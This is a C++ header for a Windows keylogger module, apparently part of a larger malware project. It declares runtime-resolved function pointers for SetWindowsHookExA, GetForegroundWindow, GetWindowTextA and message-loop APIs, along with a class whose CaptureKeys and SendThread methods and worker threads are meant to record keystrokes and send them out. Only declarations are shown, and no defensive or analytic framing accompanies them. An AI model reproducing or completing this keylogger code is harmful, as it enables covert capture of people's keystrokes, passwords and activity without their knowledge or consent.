#ifndef __KEY_MOD
#define __KEY_MOD

#include "headers.hpp"

struct st_Kernel32_KL {
	//GetModuleHandleA
	typedef HMODULE(WINAPI* LPGETMODULEHANDLEA)(LPCSTR);
	LPGETMODULEHANDLEA pGetModuleHandleA = nullptr;
};

struct st_User32_KL {
	//GetWindowTextA
	typedef int(WINAPI* LPGETWINDOWTEXTA)(HWND, LPSTR, int);
	LPGETWINDOWTEXTA pGetWindowTextA = nullptr;

	//GetForegroundWindow
	typedef HWND(WINAPI* LPGETFOREGROUNDWINDOW)();
	LPGETFOREGROUNDWINDOW pGetForegroundWindow = nullptr;

	//UnhookWindowsHookEx
	typedef BOOL(WINAPI* LPUNHOOKWINDOWSHOOKEX)(HHOOK);
	LPUNHOOKWINDOWSHOOKEX pUnhookWindowsHookEx = nullptr;

	//CallNextHookEx
	typedef LRESULT(WINAPI* LPCALLNEXTHOOKEX)(HHOOK, int, WPARAM, LPARAM);
	LPCALLNEXTHOOKEX pCallNextHookEx = nullptr;

	//SetWindowsHookExA
	typedef HHOOK(WINAPI* LPSETWINDOWSHOOKEXA)(int, HOOKPROC, HINSTANCE, DWORD);
	LPSETWINDOWSHOOKEXA pSetWindowsHookExA = nullptr;

	//PostQuitMessage
	typedef void(WINAPI* LPPOSTQUITMESSAGE)(int);
	LPPOSTQUITMESSAGE pPostQuitMessage = nullptr;

	//PeekMessageA
	typedef BOOL(WINAPI* LPPEEKMESSAGEA)(LPMSG, HWND, UINT, UINT, UINT);
	LPPEEKMESSAGEA pPeekMessageA = nullptr;

	//GetMessageA
	typedef BOOL(WINAPI* LPGETMESSAGEA)(LPMSG, HWND, UINT, UINT);
	LPGETMESSAGEA pGetMessageA = nullptr;

	//TranslateMessage
	typedef BOOL(WINAPI* LPTRANSLATEMESSAGE)(const MSG*);
	LPTRANSLATEMESSAGE pTranslateMessage = nullptr;

	//DispatchMessageA
	typedef LRESULT(WINAPI* LPDISPATCHMESSAGEA)(const MSG*);
	LPDISPATCHMESSAGEA pDispatchMessageA = nullptr;
};

class mod_Keylogger {
	public:
		mod_Keylogger();
		~mod_Keylogger();

		void Start();
		void Stop();
		void CaptureKeys();
		void SendThread();

		st_Kernel32_KL KERNEL32;
		st_User32_KL USER32;

	private:
		HMODULE hKernel32DLL = NULL;
		HMODULE hUser32DLL = NULL;

		std::mutex mtx_Run;

		bool isRunning = false;

		bool m_IsRunning();
		
		std::thread thKey;
		std::thread thSend;
};

#endif
